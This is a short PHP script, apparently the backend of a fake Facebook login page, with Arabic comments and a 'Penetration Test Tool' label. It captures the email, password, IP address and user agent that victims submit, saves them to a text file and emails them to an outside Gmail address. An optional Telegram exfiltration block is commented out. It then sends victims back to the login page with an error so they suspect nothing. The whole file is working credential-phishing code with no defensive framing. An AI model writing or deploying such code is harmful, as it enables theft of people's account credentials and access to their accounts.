<?php
// ============================================
// Facebook Phishing - Penetration Test Tool
// ============================================

$file = 'credentials.txt';

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['email']) && isset($_POST['pass'])) {
    $email = $_POST['email'];
    $pass  = $_POST['pass'];
    $ip    = $_SERVER['REMOTE_ADDR'];
    $ua    = $_SERVER['HTTP_USER_AGENT'];
    $time  = date('Y-m-d H:i:s');

    // تنسيق البيانات
    $data = "========== LOGIN CAPTURED ==========\n";
    $data .= "Time   : $time\n";
    $data .= "IP     : $ip\n";
    $data .= "Email  : $email\n";
    $data .= "Pass   : $pass\n";
    $data .= "UA     : $ua\n";
    $data .= "===================================\n\n";

    // 1️⃣ حفظ في ملف
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);

    // 2️⃣ إرسال إيميل
    $to      = 'ali7mohamed76@gmail.com';
    $subject = '🎯 فيسبوك - تم تسجيل بيانات دخول جديدة';
    $message = "========== LOGIN CAPTURED ==========\n";
    $message .= "Time   : $time\n";
    $message .= "IP     : $ip\n";
    $message .= "Email  : $email\n";
    $message .= "Pass   : $pass\n";
    $message .= "===================================\n";
    $headers = 'From: tester@yourdomain.com' . "\r\n" .
               'Reply-To: tester@yourdomain.com' . "\r\n" .
               'X-Mailer: PHP/' . phpversion();
    mail($to, $subject, $message, $headers);

    // 3️⃣ إرسال تليجرام (فعل لو عايز)
    /*
    $botToken = 'YOUR_BOT_TOKEN';
    $chatId   = 'YOUR_CHAT_ID';
    $msg = urlencode("🎯 فيسبوك\n📧 $email\n🔑 $pass\n🌐 $ip\n🕒 $time");
    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$msg");
    */

    // ⬅️ بدال ما يحول لـ error.html، يحول لـ index.html مع باراميتر error
    header('Location: index.html?error=1');
    exit;
} else {
    header('Location: index.html');
    exit;
}
?>
